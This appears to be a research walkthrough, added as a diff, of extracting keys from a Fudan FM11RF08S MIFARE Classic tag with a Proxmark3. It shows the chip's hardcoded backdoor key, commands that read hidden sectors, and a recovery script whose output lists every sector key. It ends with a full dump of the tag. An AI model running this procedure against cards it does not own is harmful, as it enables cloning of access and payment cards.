@@ -1,0 +1,713 @@
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~ Connect Proxmark
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+`sudo dmesg -W`
+
+	** Connect Proxmark **
+
+[642295.161000] usb 2-2.1: new full-speed USB device number 57 using uhci_hcd
+[642295.486723] usb 2-2.1: New USB device found, idVendor=9ac4, idProduct=4b8f, bcdDevice= 1.00
+[642295.486767] usb 2-2.1: New USB device strings: Mfr=1, Product=2, SerialNumber=3
+[642295.486801] usb 2-2.1: Product: proxmark3
+[642295.486827] usb 2-2.1: Manufacturer: proxmark.org
+[642295.486852] usb 2-2.1: SerialNumber: iceman__1098234082304984
+[642295.502854] cdc_acm 2-2.1:1.0: ttyACM0: USB ACM device
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~ Start Program
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+`cd /home/user/proxmark3/`
+`./pm3`
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~ Detect Card
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	** Place tag on Reader **
+
+[usb] pm3 --> hf search
+
+ 🕑  Searching for ThinFilm tag...[!] ⚠️  timeout while waiting for reply.
+ 🕗  Searching for ISO14443-A tag...
+[=] ---------- ISO14443-A Information ----------
+[+]  UID: 5C B4 9C A6   ( ONUID, re-used )
+[+] ATQA: 00 04
+[+]  SAK: 08 [2]
+[+] Possible types:
+[+]    MIFARE Classic 1K
+[=] proprietary non iso14443-4 card found, RATS not supported
+[=]
+[+] Prng detection....... weak
+
+[?] Hint: try `hf mf` commands
+
+[+] Valid ISO 14443-A tag found
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~ Retrieve card info
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+[usb] pm3 --> hf mf info
+
+[=] --- ISO14443-a Information ---------------------
+[+]  UID: 5C B4 9C A6
+[+] ATQA: 00 04
+[+]  SAK: 08 [2]
+
+[=] --- Keys Information
+[+] loaded  2 user keys
+[+] loaded 61 keys from hardcoded default array
+[+] Backdoor key..... A396EFA4E24F
+[+] Block 0.......... 5C B4 9C A6 D2 08 04 00 04 59 92 25 BF 5F 70 90 | \........Y.%._p.
+
+[=] --- Fingerprint
+[+] Fudan FM11RF08S
+
+[=] --- Magic Tag Information
+[=] <n/a>
+
+[=] --- PRNG Information
+[+] Prng....... weak
+
+
+	NOTE THE FINGERPRINT :  [+] Fudan FM11RF08S
+	NOTE THE BACKDOOR KEY:  [+] Backdoor key..... A396EFA4E24F
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~ Read a sector with the backdoor key
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Let's ReaD a SeCtor [rdsc]:
+
+              High Frequency
+              |  Mifare classic
+              |  |  read sector
+              |  |  |    Backdoor keyhole
+              |  |  |    |    Backdoor key       sector number
+              |  |  |    |    |                  |
+			  '  '  '    '    '                  '
+[usb] pm3 --> hf mf rdsc -c 4 --key A396EFA4E24F -s 0
+                                    ^^^^^^^^^^^^
+                                         `--- The backdoor key [see above]
+
+[=]   # | sector 00 / 0x00                                | ascii
+[=] ----+-------------------------------------------------+-----------------
+[=]   0 | 5C B4 9C A6 D2 08 04 00 04 59 92 25 BF 5F 70 90 | \........Y.%._p.
+[=]   1 | 41 30 30 2D 47 31 00 00 47 46 41 30 30 00 00 00 | A00-G1..GFA00...
+[=]   2 | 50 4C 41 00 00 00 00 00 00 00 00 00 00 00 00 00 | PLA.............
+[=]   3 | 00 00 00 00 00 00 87 87 87 69 00 00 00 00 00 00 | .........i......
+          ^^^^^^^^^^^^^^^^^             ^^^^^^^^^^^^^^^^^
+                `-- NOTE THE ABSENCE OF KEYS --'
+
+Logic:
+	If ((BlockNumber % 4) == 3)
+		ReturnData = ReturnData & 0x000000'000000'FFFF'FFFF'000000'000000
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~ Read a block with the backdoor key
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+The issue is the same if we use the ReaD BLock command:
+
+[usb] pm3 --> hf mf rdbl -c 4 --key A396EFA4E24F --blk 0
+
+[=]   # | sector 00 / 0x00                                | ascii
+[=] ----+-------------------------------------------------+-----------------
+[=]   0 | 5C B4 9C A6 D2 08 04 00 04 59 92 25 BF 5F 70 90 | \........Y.%._p.
+
+[usb] pm3 --> hf mf rdbl -c 4 --key A396EFA4E24F --blk 3
+
+[=]   # | sector 00 / 0x00                                | ascii
+[=] ----+-------------------------------------------------+-----------------
+[=]   3 | 00 00 00 00 00 00 87 87 87 69 00 00 00 00 00 00 | .........i......
+          ^^^^^^^^^^^^^^^^^             ^^^^^^^^^^^^^^^^^
+                `-- NOTE THE ABSENCE OF KEYS --'
+
+Logic:
+	If ((BlockNumber % 4) == 3)
+		ReturnData = ReturnData & 0x000000'000000'FFFF'FFFF'000000'000000
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~ Analysis of Block 0
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Let's examine block 0 closer
+
+[=]   0 | 5C B4 9C A6 D2 08 04 00 04 59 92 25 BF 5F 70 90 |
+          |^^^^^^^^^^ |^ |^ |^^^^ |^^^^^^^^^^^^^^^^^^^^^^
+          |           |  |  |     |
+          |           |  |  |     `--- Manufacturer Data
+          |           |  |  `--- ATQA
+          |           |  `--- SAK (vanity)
+          `--- UID    `--- BCC (UID CRC)
+
+Moreso, let's take a closer look at the manufacturer data:
+
+	   Signature (unknown)
+	   |
+	   |vvvvvvvvvvvvvvvv
+	04 59 92 25 BF 5F 70 90  --- Manufacturer Data
+	|^                   |^
+	`--------------------`---- 0490 --> Fudan FM11RF08S
+	                           0390       "      "
+	                           0190       "      "
+	                           011D --> Fudan FM11RF08 (not S)
+	                           021D       "      "        "
+	                           031D       "      "        "
+	                           ??91 --> Maybe Fudan FM11RF08 (not S)
+	                           ??98       "     "       "       "
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~ Validate the authenticity of the card
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+There is an online portal which allows us to validate authentic cards:
+
+The "unknown signature" is assumed to be:
+	Part of an HMAC of the non-signature bytes in Block 0
+
+If you visit this page:
+	http://rfid.fm-uivs.com:19004/m1/
+You will get shown a QR code, which will take you to:
+	https://rfid.fm-uivs.com/m1/static/apks/NFC_tag_asst.apk
+...to download an Android APK
+
+If you (are brave enough to) side-load this APK to your phone,
+you will be able to scan an RF08/RF08S card
+and, so long as block zero can be read, it will be read
+and submitted to Fudan for validation
+
+Alternatively, you can just decompile the APK and work out that all it does is
+"Post" Block 0 of the card to their website, and await a simple json reply.
+
+You can simulate this with a trivial `wget` request
+
+	BLK0=5CB49CA6D208040004599225BF5F7090
+	HDR="Content-Type: application/text; charset=utf-8"
+	URL=https://rfid.fm-uivs.com/nfcTools/api/M1KeyRest
+	wget -q  -O -  --header="${HDR}"  --post-data "${BLK0}"  ${URL}  | json_pp
+
+Or, if you prefer:
+	wget -q  -O -  \
+		--header="Content-Type: application/text; charset=utf-8"  \
+		--post-data "5CB49CA6D208040004599225BF5F7090"  \
+		https://rfid.fm-uivs.com/nfcTools/api/M1KeyRest  \
+	| json_pp
+
+In reply you will see either:
+	{
+		"code" : 0,
+		"data" : null,
+		"message" : "success"
+	}
+or
+	{
+		"code" : -9,
+		"data" : null,
+		"message" : "input error"
+	}
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~ Validation script
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+#!/bin/bash
+
+# --- Sanitise the input
+BLK0=`sed 's/ //g' <<<$*`
+if ((${#*} != 16)) || (( ${#BLK0} != 32 )) || ! ((16#${BLK0})) 2>/dev/null; then
+	echo "Use: $0 <block 0 data as bytes>"
+	echo "Ie.  $0 00 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF"
+	exit 1
+fi
+
+# --- Break it down
+echo "Check: ${BLK0:0:8} ${BLK0:8:2} ${BLK0:10:2} ${BLK0:12:4} ${BLK0:16:2} ${BLK0:18:12} ${BLK0:30:2}"
+echo "UID  : ${BLK0:0:8}/${BLK0:8:2}"
+echo "SAK  : ${BLK0:10:2}"
+echo "ATQA : ${BLK0:12:4}"
+
+# --- Compile the ID
+IDA="${BLK0:16:2}"
+IDB="${BLK0:30:2}"
+ID="${IDA}${IDB}"
+
+# --- Identify the card
+card=0  # assume failure
+
+echo -n "Card : "
+if [[ ${IDB} == 90 ]] ; then
+	if [[ ${IDA} == 01 ||  ${IDA} == 03 ||  ${IDA} == 04 ]] ; then
+		echo -n "Fudan FM11RF08S"
+		card=1
+	fi
+elif [[ ${IDB} == 1D ]] ; then
+	if [[ ${IDA} == 01 ||  ${IDA} == 02 ||  ${IDA} == 03 ]] ; then
+		echo -n "Fudan FM11RF08"
+		card=1;
+	fi
+elif [[ ${IDB} == 91 || ${IDB} == 98 ]] ; then
+		echo -n "Fudan FM11RF08 (never seen)"
+		card=1;
+fi
+
+# --- Either abort (for unknown cards), or display the card info
+((card == 0)) && {
+	echo "Unknown - submission aborted."
+	exit 9
+} || {
+	echo " .. ID=${ID} .. HMAC=${BLK0:18:12}"
+}
+
+# --- Doit!
+URL=https://rfid.fm-uivs.com/nfcTools/api/M1KeyRest
+HDR="Content-Type: application/text; charset=utf-8"
+
+echo "Submit \"${BLK0}\" to ${URL}"
+
+wget -q  -O -  --header="${HDR}"  --post-data "${BLK0}"  ${URL}  \
+| json_pp
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~ Read the Dark Blocks
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Using 'read block', we can read the "Dark Blocks" {128..135}
+
+[usb] pm3 --> hf mf rdbl -c 4 --key A396EFA4E24F --blk 127
+
+[#] Auth error
+
+[usb] pm3 --> hf mf rdbl -c 4 --key A396EFA4E24F --blk 128
+
+[=]   # | sector 32 / 0x20                                | ascii
+[=] ----+-------------------------------------------------+-----------------
+[=] 128 | A5 5A 3C C3 3C F0 00 00 00 00 00 00 00 04 08 88 | .Z<.<...........
+
+[usb] pm3 --> hf mf rdbl -c 4 --key A396EFA4E24F --blk 129
+
+[=]   # | sector 32 / 0x20                                | ascii
+[=] ----+-------------------------------------------------+-----------------
+[=] 129 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+
+[usb] pm3 --> hf mf rdbl -c 4 --key A396EFA4E24F --blk 130
+
+[=]   # | sector 32 / 0x20                                | ascii
+[=] ----+-------------------------------------------------+-----------------
+[=] 130 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+
+[usb] pm3 --> hf mf rdbl -c 4 --key A396EFA4E24F --blk 131
+
+[=]   # | sector 32 / 0x20                                | ascii
+[=] ----+-------------------------------------------------+-----------------
+[=] 131 | 00 00 00 00 00 00 00 F0 FF 0F 00 00 00 00 00 00 | ................
+
+[usb] pm3 --> hf mf rdbl -c 4 --key A396EFA4E24F --blk 132
+
+[=]   # | sector 32 / 0x20                                | ascii
+[=] ----+-------------------------------------------------+-----------------
+[=] 132 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+
+[usb] pm3 --> hf mf rdbl -c 4 --key A396EFA4E24F --blk 133
+
+[=]   # | sector 32 / 0x20                                | ascii
+[=] ----+-------------------------------------------------+-----------------
+[=] 133 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+
+[usb] pm3 --> hf mf rdbl -c 4 --key A396EFA4E24F --blk 134
+
+[=]   # | sector 32 / 0x20                                | ascii
+[=] ----+-------------------------------------------------+-----------------
+[=] 134 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+
+[usb] pm3 --> hf mf rdbl -c 4 --key A396EFA4E24F --blk 135
+
+[=]   # | sector 32 / 0x20                                | ascii
+[=] ----+-------------------------------------------------+-----------------
+[=] 135 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+
+[usb] pm3 --> hf mf rdbl -c 4 --key A396EFA4E24F --blk 136
+
+[#] Auth error
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+It seems these are two sectors
+...and it seems the second sector has a trailer which is all 0's
+[see the whitepaper for more info - around about "listing 6"]
+
+[=]   # | Dark Sectors                                    | ascii
+[=] ----+-------------------------------------------------+-----------------
+[=] 128 | A5 5A 3C C3 3C F0 00 00 00 00 00 00 00 04 08 88 | .Z<.<...........
+[=] 129 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=] 130 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=] 131 | 00 00 00 00 00 00 00 F0 FF 0F 00 00 00 00 00 00 | ................
+                            ^^^^^^^^^^^
+
+[=] 132 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=] 133 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=] 134 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=] 135 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+                            ^^^^^^^^^^^
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~ Run the PM3 Key extraction script (15..30 mins)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+We can use the provided script to extract the keys
+...it takes about 20 minutes
+...and the keys drop out in pairs once every minute-or-two
+...I have heard "less than 30 minutes total" is to be expected
+...As you can see, this example run took 17m30s
+
+[usb] pm3 --> script run fm11rf08s_recovery.py
+
+[+] executing python /home/prox/proxmark3/client/pyscripts/fm11rf08s_recovery.py
+[+] args ''
+UID: 5CB49CA6
+Getting nonces...
+Generating first dump file
+Data have been dumped to `hf-mf-5CB49CA6-dump.bin`
+----Step 1:  0 minutes  2 seconds -----------
+Loading mfc_default_keys.dic
+Running staticnested_1nt & 2x1nt when doable...
+Looking for common keys across sectors...
+Computing needed time for attack...
+----Step 2:  0 minutes 43 seconds -----------
+Still about 15 minutes 31 seconds to run...
+Brute-forcing keys... Press any key to interrupt
+Sector  0 keyB = d538def7b725
+Sector  0 keyA = 8693fc621e12
+Sector  1 keyB = f4c0c55efc6a
+Sector  1 keyA = 40a282c042aa
+Sector  2 keyB = 4422b9889125
+Sector  2 keyA = 184e3a2e94ca
+Sector  3 keyB = 5e5b3758858d
+Sector  3 keyA = dd706a9ee951
+Sector  4 keyB = 51c3d96a0662
+Sector  4 keyA = cd3a76149582
+Sector  5 keyB = 674f46f05025
+Sector  5 keyA = 091a165322eb
+Sector  6 keyB = b48ba097d7b5
+Sector  6 keyA = d0d277bc5c94
+Sector  7 keyB = 8c10fbbe4bcf
+Sector  7 keyA = cd9edfd14d29
+Sector  8 keyB = 92e3f0e07b4c
+Sector  8 keyA = ae46323d85b5
+Sector  9 keyB = 4f252e68091e
+Sector  9 keyA = 7758739e39b3
+Sector 10 keyB = 4da6db3303e0
+Sector 10 keyA = f87d61e37cf0
+Sector 11 keyB = 37355580af8a
+Sector 11 keyA = ad44d2c7b55c
+Sector 12 keyB = 0ab78eae4708
+Sector 12 keyA = f9aa7ada600d
+Sector 13 keyB = 96947eab2af6
+Sector 13 keyA = 9743553d9ead
+Sector 14 keyB = 1be13ff8cda1
+Sector 14 keyA = ae19cd0a6e4e
+Sector 15 keyB = 6715bbd7a562
+Sector 15 keyA = a12932a626a7
+Sector 32 keyB = 000095dd9ecd
+Sector 32 keyA = 64966fac1571
+
+[+] found keys:
+
+[+] -----+-----+--------------+---+--------------+----
+[+]  Sec | Blk | key A        |res| key B        |res
+[+] -----+-----+--------------+---+--------------+----
+[+]  000 | 003 | 8693fc621e12 | 1 | d538def7b725 | 1
+[+]  001 | 007 | 40a282c042aa | 1 | f4c0c55efc6a | 1
+[+]  002 | 011 | 184e3a2e94ca | 1 | 4422b9889125 | 1
+[+]  003 | 015 | dd706a9ee951 | 1 | 5e5b3758858d | 1
+[+]  004 | 019 | cd3a76149582 | 1 | 51c3d96a0662 | 1
+[+]  005 | 023 | 091a165322eb | 1 | 674f46f05025 | 1
+[+]  006 | 027 | d0d277bc5c94 | 1 | b48ba097d7b5 | 1
+[+]  007 | 031 | cd9edfd14d29 | 1 | 8c10fbbe4bcf | 1
+[+]  008 | 035 | ae46323d85b5 | 1 | 92e3f0e07b4c | 1
+[+]  009 | 039 | 7758739e39b3 | 1 | 4f252e68091e | 1
+[+]  010 | 043 | f87d61e37cf0 | 1 | 4da6db3303e0 | 1
+[+]  011 | 047 | ad44d2c7b55c | 1 | 37355580af8a | 1
+[+]  012 | 051 | f9aa7ada600d | 1 | 0ab78eae4708 | 1
+[+]  013 | 055 | 9743553d9ead | 1 | 96947eab2af6 | 1
+[+]  014 | 059 | ae19cd0a6e4e | 1 | 1be13ff8cda1 | 1
+[+]  015 | 063 | a12932a626a7 | 1 | 6715bbd7a562 | 1
+[+]  032 | 131 | 64966fac1571 | 1 | 000095dd9ecd | 1
+[+] -----+-----+--------------+---+--------------+----
+[+] ( 0:Failed / 1:Success )
+
+[+] Generating binary key file
+[+] Found keys have been dumped to `hf-mf-5CB49CA6-key.bin`
+[+] Generating final dump file
+[+] Data have been dumped to `hf-mf-5CB49CA6-dump.bin`
+----Step 3: 16 minutes 43 seconds -----------
+---- TOTAL: 17 minutes 29 seconds -----------
+
+[+] finished fm11rf08s_recovery.py
+
+SAVE FILE LOCATION : for some reason this script puts it's dump files
+                     in /proxmark3/ ...unlike the other MF commands :/
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~ Dump the Keys file
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+`/home/user/proxmark3/hf-mf-5CB49CA6-dump.bin`
+
+hexdump -v -e '"%04.4_ax:  " 6/1 "%02x " "\n"'   hf-mf-5CB49CA6-key.bin
+
+0000:  86 93 fc 62 1e 12  First all the Key-A's
+0006:  40 a2 82 c0 42 aa   in ascending sector number order
+000c:  18 4e 3a 2e 94 ca
+0012:  dd 70 6a 9e e9 51
+0018:  cd 3a 76 14 95 82
+001e:  09 1a 16 53 22 eb
+0024:  d0 d2 77 bc 5c 94
+002a:  cd 9e df d1 4d 29
+0030:  ae 46 32 3d 85 b5
+0036:  77 58 73 9e 39 b3
+003c:  f8 7d 61 e3 7c f0
+0042:  ad 44 d2 c7 b5 5c
+0048:  f9 aa 7a da 60 0d
+004e:  97 43 55 3d 9e ad
+0054:  ae 19 cd 0a 6e 4e
+005a:  a1 29 32 a6 26 a7
+0060:  64 96 6f ac 15 71  <-- Dark sector Key-A
+
+0066:  d5 38 de f7 b7 25  Then all the Key-B's
+006c:  f4 c0 c5 5e fc 6a
+0072:  44 22 b9 88 91 25
+0078:  5e 5b 37 58 85 8d
+007e:  51 c3 d9 6a 06 62
+0084:  67 4f 46 f0 50 25
+008a:  b4 8b a0 97 d7 b5
+0090:  8c 10 fb be 4b cf
+0096:  92 e3 f0 e0 7b 4c
+009c:  4f 25 2e 68 09 1e
+00a2:  4d a6 db 33 03 e0
+00a8:  37 35 55 80 af 8a
+00ae:  0a b7 8e ae 47 08
+00b4:  96 94 7e ab 2a f6
+00ba:  1b e1 3f f8 cd a1
+00c0:  67 15 bb d7 a5 62
+00c6:  00 00 95 dd 9e cd  <-- Dark sector Key-B
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~ Dump the Data File
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+`hexdump -v -C hf-mf-5CB49CA6-dump.bin | sed '0~4 a\\'`
+
+0000  5c b4 9c a6 d2 08 04 00  04 59 92 25 bf 5f 70 90  |\........Y.%._p.|
+0010  41 30 30 2d 47 31 00 00  47 46 41 30 30 00 00 00  |A00-G1..GFA00...|
+0020  50 4c 41 00 00 00 00 00  00 00 00 00 00 00 00 00  |PLA.............|
+0030  86 93 fc 62 1e 12 87 87  87 69 d5 38 de f7 b7 25  |...b.....i.8...%|
+
+0040  50 4c 41 20 42 61 73 69  63 00 00 00 00 00 00 00  |PLA Basic.......|
+0050  00 ae 42 ff fa 00 00 00  00 00 e0 3f 00 00 00 00  |..B........?....|
+0060  37 00 08 00 01 00 23 00  e6 00 be 00 00 00 00 00  |7.....#.........|
+0070  40 a2 82 c0 42 aa 87 87  87 69 f4 c0 c5 5e fc 6a  |@...B....i...^.j|
+
+0080  88 13 88 13 e8 03 e8 03  9a 99 19 3f cd cc 4c 3e  |...........?..L>|
+0090  44 25 18 96 e4 f3 43 8c  b1 fa 02 d0 90 25 1f 28  |D%....C......%.(|
+00a0  00 00 00 00 e1 19 00 00  00 00 00 00 00 00 00 00  |................|
+00b0  18 4e 3a 2e 94 ca 87 87  87 69 44 22 b9 88 91 25  |.N:......iD"...%|
+
+00c0  32 30 32 34 5f 30 33 5f  32 32 5f 31 36 5f 32 39  |2024_03_22_16_29|
+00d0  32 34 5f 30 33 5f 32 32  5f 31 36 00 00 00 00 00  |24_03_22_16.....|
+00e0  00 00 00 00 52 00 00 00  00 00 00 00 00 00 00 00  |....R...........|
+00f0  dd 70 6a 9e e9 51 87 87  87 69 5e 5b 37 58 85 8d  |.pj..Q...i^[7X..|
+
+0100  02 00 01 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+0110  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+0120  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+0130  cd 3a 76 14 95 82 87 87  87 69 51 c3 d9 6a 06 62  |.:v......iQ..j.b|
+
+0140  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+0150  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+0160  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+0170  09 1a 16 53 22 eb 87 87  87 69 67 4f 46 f0 50 25  |...S"....igOF.P%|
+
+0180  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+0190  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+01a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+01b0  d0 d2 77 bc 5c 94 87 87  87 69 b4 8b a0 97 d7 b5  |..w.\....i......|
+
+01c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+01d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+01e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+01f0  cd 9e df d1 4d 29 87 87  87 69 8c 10 fb be 4b cf  |....M)...i....K.|
+
+0200  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+0210  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+0220  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+0230  ae 46 32 3d 85 b5 87 87  87 69 92 e3 f0 e0 7b 4c  |.F2=.....i....{L|
+
+0240  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+0250  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+0260  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+0270  77 58 73 9e 39 b3 87 87  87 69 4f 25 2e 68 09 1e  |wXs.9....iO%.h..|
+
+0280  01 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+0290  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+02a0  48 5b 1c d2 a2 ed 2f 7d  d9 72 3f 48 90 37 4f 81  |H[..../}.r?H.7O.|
+02b0  f8 7d 61 e3 7c f0 87 87  87 69 4d a6 db 33 03 e0  |.}a.|....iM..3..|
+
+02c0  d6 f0 8f 4c f7 94 77 f4  eb 90 c8 92 3a f6 03 d4  |...L..w.....:...|
+02d0  3c 96 7e cb 19 1e eb 5e  06 2d 71 0e 60 47 95 d8  |<.~....^.-q.`G..|
+02e0  81 69 8c aa 13 58 e9 9c  87 eb c5 5b ca fd 66 95  |.i...X.....[..f.|
+02f0  ad 44 d2 c7 b5 5c 87 87  87 69 37 35 55 80 af 8a  |.D...\...i75U...|
+
+0300  54 7c af a5 8f ff 93 0d  24 b7 d7 eb 8b e1 4a 61  |T|......$.....Ja|
+0310  62 8b ea df 4b 45 5d 9d  b4 3a 60 be 51 71 11 df  |b...KE]..:`.Qq..|
+0320  01 81 29 72 d9 60 c5 10  d2 b5 b3 b5 31 42 0f 3e  |..)r.`......1B.>|
+0330  f9 aa 7a da 60 0d 87 87  87 69 0a b7 8e ae 47 08  |..z.`....i....G.|
+
+0340  c0 f4 74 69 3d 2e ed 2c  c9 81 4b cf 73 00 23 52  |..ti=..,..K.s.#R|
+0350  99 b6 3f eb 52 3b 55 14  11 be 8c 79 46 4f 8c 9d  |..?.R;U....yFO..|
+0360  d0 db 52 1e 8e 01 19 9f  13 31 a2 a7 42 f8 74 0d  |..R......1..B.t.|
+0370  97 43 55 3d 9e ad 87 87  87 69 96 94 7e ab 2a f6  |.CU=.....i..~.*.|
+
+0380  6a 78 3c 37 2e 4e 61 d5  ba 2e 87 a8 14 b8 d1 1f  |jx<7.Na.........|
+0390  a0 ab ab ea 66 07 0d c0  ac 3a 29 5c 2c f5 f8 79  |....f....:)\,..y|
+03a0  3d 71 6a 94 89 43 ed 83  79 85 03 6a 3a cf 69 e4  |=qj..C..y..j:.i.|
+03b0  ae 19 cd 0a 6e 4e 87 87  87 69 1b e1 3f f8 cd a1  |....nN...i..?...|
+
+03c0  2c 5e 22 d6 26 c5 fd a8  13 e3 81 29 cc bb 93 23  |,^".&......)...#|
+03d0  79 5b f7 3a 4f 7f 42 7e  3e d0 fc 47 88 0f 9f 94  |y[.:O.B~>..G....|
+03e0  cb 6f 8a 8e 58 40 5e a5  a9 fe ea 69 4a 2f fb 06  |.o..X@^....iJ/..|
+03f0  a1 29 32 a6 26 a7 87 87  87 69 67 15 bb d7 a5 62  |.)2.&....ig....b|
+
+	NOTICE: NEITHER OF THE DARK SECTORS HAVE BEEN DUMPED
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~ Dump the tag using the extracted keys
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+[usb] pm3 --> hf mf dump
+
+[=] Using... hf-mf-5CB49CA6-key.bin
+[+] Loaded binary key file `hf-mf-5CB49CA6-key.bin`
+[=] Reading sector access bits...
+[=] .................
+[+] Finished reading sector access bits
+[=] Dumping all blocks from card...
+ 🕓 Sector... 15 block... 3 ( ok )
+[+] Succeeded in dumping all blocks
+
+[+] time: 10 seconds
+
+[=] -----+-----+-------------------------------------------------+-----------------
+[=]  sec | blk | data                                            | ascii
